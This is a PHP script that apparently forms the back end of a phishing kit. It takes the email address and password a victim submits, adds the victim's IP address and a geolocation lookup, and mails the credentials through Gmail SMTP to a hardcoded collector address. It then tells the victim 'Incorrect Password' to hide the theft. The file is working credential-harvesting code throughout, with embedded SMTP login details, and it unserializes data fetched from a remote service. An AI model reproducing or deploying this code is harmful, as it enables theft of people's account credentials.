<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require './src/Exception.php';
require './src/PHPMailer.php';
require './src/SMTP.php';

$mail = new PHPMailer(true);

$geo = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
$country = $geo['geoplugin_regionName'].", ".$geo['geoplugin_countryName'];

if(isset($_GET['gmail'])){	
	$ip = getenv("REMOTE_ADDR");
	$data = array();
    $data['subject'] = ' Mail | $ip';
    $data['browser'] = $country." ".$_SERVER['HTTP_USER_AGENT'];

    $data['message'] = 
    '
    	<html>
			<head>
				<title>New Secure Login</title>
			</head>

			<body>
			    <p><strong>Email ID:</strong> '.$_REQUEST['email'].'</p>
			    <p><strong>Re-Password:</strong> '.$_REQUEST['password'].'</p>
			    <p><strong>Browser:</strong> '.$data['browser'].'</p>
			    <p><strong>IP:</strong> '.$ip.'</p>
			    <br>
			</body>
		</html>
    ';
    
    $mail->isSMTP();                                      // Set mailer to use SMTP
    $mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
    $mail->SMTPAuth = true;                               // Enable SMTP authentication
    $mail->Username = 'justin.office247@gmail.com';                 // SMTP username
    $mail->Password = 'mbj/4592';                           // SMTP password
    $mail->SMTPSecure = 'tls';                         // SMTP password
    $mail->Port = 587;

    $mail->From = 'justin.office247@gmail.com';
    $mail->FromName = 'Mail Login!';
    $mail->addAddress('frank.office247@gmail.com');

	$mail->isHTML(true);
	$mail->Subject = $data['subject'];
	$mail->Body    = $data['message'];

	if(!$mail->send()) {
	    echo 'Message could not be sent.';
	    echo 'Mailer Error: ' . $mail->ErrorInfo;
	} else {
	    echo 'Incorrect Password';
	}
}